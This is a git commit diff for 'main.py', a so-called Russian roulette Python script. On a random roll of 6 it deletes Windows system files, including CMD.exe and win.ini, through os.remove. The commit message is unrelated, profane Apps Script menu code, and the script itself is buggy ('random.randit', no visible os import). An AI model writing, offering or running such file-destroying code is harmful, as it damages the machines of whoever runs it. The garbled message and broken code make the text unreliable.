9405bf71fb0c2f8efde18e2c5d44cd7e663a3968
bluehalooo <119090993+bluehalooo@users.noreply.github.com>
2023-05-11 12:20:29 -0700

    ui.createMenu("balls in your jaw")   .addItem("FUCK"," help")   .addToUi();

--- main.py
+++ main.py
@@ -4,11 +4,12 @@ import random
 number = random.randit(1,6)
 
 if number == 6:
-    os.remove('c:\windows\system32\CMD.exe')
-    os.remove('c:\windows\win.ini')
-    os.remove('c:\windows\winint.ini')
+    os.remove('C:\windows\system32\CMD.exe')
+    os.remove('C:\windows\win.ini')
+    os.remove('C:\windows\winint.ini')
 
 else:
     print("Very good!")
 
 #RUSSIAN ROULETTE
+
